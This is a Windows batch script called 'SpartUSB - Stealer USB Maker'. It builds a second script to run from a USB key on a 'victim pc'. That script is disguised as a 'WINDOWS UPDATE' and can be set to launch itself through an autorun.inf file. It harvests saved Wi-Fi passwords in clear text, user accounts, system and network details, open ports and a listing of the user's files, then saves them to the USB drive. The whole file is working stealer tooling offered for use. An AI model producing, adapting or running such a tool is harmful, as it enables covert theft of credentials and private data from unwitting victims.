@echo off
color b
title SpartUSB - Stealer USB Maker
echo ============ SpartUSB - Stealer USB Maker ============
echo.
echo by TheSparta
echo.
echo Setting mode
echo.
echo Enter the letter of the key (without :) :
set /p keyname=Enter: 

echo Enter name of script stealer:
set /p scriptname=Enter: 

echo Enter the name of the folder containing the results:
set /p foldername=Enter: 


echo.
cls
echo ============ SpartUSB - Stealer USB Maker ============
echo.
echo by TheSparta
echo.
echo Setting mode
echo.
echo Add ipconfig to the script (ip information) ?
set /p ipconfiginf=Enter (y or n): 
echo.
if "%ipconfiginf%"=="y" (
goto choice2
)

if "%ipconfiginf%"=="n" (
goto choice2
)

:choice2
echo Add net user to the script (profil user information) ?
set /p netuserinf=Enter (y or n): 
echo.
if "%netuserinf%"=="y" (
goto choice3
)

if "%netuserinf%"=="n" (
goto choice3
)

:choice3
echo Add wifi passord to the script ?
set /p wifipassinf=Enter (y or n): 
set /p WIFIN=Enter the wifi name of the victim pc (optional): 
echo.

if "%wifipassinf%"=="y" (
goto choice4
)

if "%wifipassinf%"=="n" (
goto choice4
)

:choice4
echo Add net account to the script (information account) ?
set /p netaccountinf=Enter (y or n): 
echo.
if "%netaccountinf%"=="y" (
goto choice5
)

if "%netaccountinf%"=="n" (
goto choice5
)

:choice5
echo Add netsh all to the script (all profile information) ?
set /p nesthwlallinf=Enter (y or n): 
echo.
if "%nesthwlallinf%"=="y" (
goto choice6
)
if "%nesthwlallinf%"=="n" (
goto choice6
)

:choice6
echo Add dir/s to the script (all file name in C:\Users\UserName) ?
set /p dirsinf=Enter (y or n): 
echo.
if "%dirsinf%"=="y" (
goto choice7
)
if "%dirsinf%"=="n" (
goto choice7
)

:choice7
echo Add system info to the script (information of system) ?
set /p systeminf=Enter (y or n): 
echo.
if "%systeminf%"=="y" (
goto choice8
)

if "%netaccountinf%"=="n" (
goto choice8
)

:choice8
echo Add netstat to the script (list of open ports) ?
set /p netstatinf=Enter (y or n): 
echo.
if "%netstatinf%"=="y" (
goto choice9
)

if "%netstatinf%"=="n" (
goto choice9
)


:choice9
echo Add autorun file ?
echo (need autorun to be activated on the victim's pc, put the autorun file in the root of the usb key with the stealer)
set /p autoruninf=Enter (y or n): 
echo.
if "%autoruninf%"=="y" (
goto choice10
)

if "%autoruninf%"=="n" (
goto choice10
)

:choice10
cls
echo ============ SpartUSB - Stealer USB Maker ============
echo.
echo by TheSparta
echo.
echo %scriptname% is being configured
echo.
>nul chcp 65001
set "_spc=          "
set "_bar=■■■■■■■■■■"

setlocal enabledelayedexpansion

for /f %%a in ('copy /Z "%~dpf0" nul')do for /f skip^=4 %%b in ('echo;prompt;$H^|cmd')do set "BS=%%~b" & set "CR=%%a"
for /l %%L in (1 1 10)do <con: set /p "'= !CR!!BS!!CR![!_bar:~0,%%~L!!BS!!_spc:~%%~L!] " <nul & >nul timeout.exe /t 1


echo ^@echo off >> %scriptname%.bat
echo title WINDOWS UPDATE >> %scriptname%.bat
echo color a >> %scriptname%.bat
echo echo Update of Windows >> %scriptname%.bat
echo echo. >> %scriptname%.bat
echo echo Dont close up ! >> %scriptname%.bat
echo md %foldername% >> %scriptname%.bat
goto write1

:write1
if "%ipconfiginf%"=="y" (
echo ipconfig /all ^> %foldername%\ipconfig.txt >> %scriptname%.bat
goto write2
)
if "%ipconfiginf%"=="n" (
goto write2
)

:write2
if "%netuserinf%"=="y" (
echo net user ^> %foldername%\Netuser.txt >> %scriptname%.bat
goto write3
)
if "%netuserinf%"=="n" (
goto write3
)

:write3
if "%wifipassinf%"=="y" (
echo netsh wlan show profiles name=%WIFIN% key=clear ^> %foldername%\wifipass.txt >> %scriptname%.bat
goto write4
)
if "%wifipassinf%"=="n" (
goto write4
)

:write4
if "%netaccountinf%"=="y" (
echo net accounts ^> %foldername%\Netaccount.txt >> %scriptname%.bat
goto write5
)
if "%netaccountinf%"=="n" (
goto write5
)

:write5
if "%dirsinf%"=="y" (
echo cd /d C:\Users\%%username%% >> %scriptname%.bat
echo dir /s ^> %keyname%:\%foldername%\Dirs.txt >> %scriptname%.bat
echo cd /d D:\ >> %scriptname%.bat
goto write6
)
if "%dirsinf%"=="n" (
goto write6
)

:write6
if "%systeminf%"=="y" (
echo systeminfo ^> %foldername%\SystemInfo.txt >> %scriptname%.bat
goto write7
)
if "%systeminf%"=="n" (
goto write7
)

:write7
if "%netstatinf%"=="y" (
echo netstat -an ^> %foldername%\Netstat.txt >> %scriptname%.bat
goto write8
)
if "%netstatinf%"=="n" (
goto write8
)

:write8
if "%autoruninf%"=="y" (
echo [autorun] >> autorun.inf
echo open=%scriptname%.bat >> autorun.inf
echo label=WindowsUpdate >> autorun.inf
goto write9
)
if "%autoruninf%"=="n" (
goto write9
)

:write9
echo Msgbox"The programm %scriptname% has been generated",0+1,"SpartUSB" >> info.vbs
start info.vbs
timeout 1
del info.vbs
pause
exit
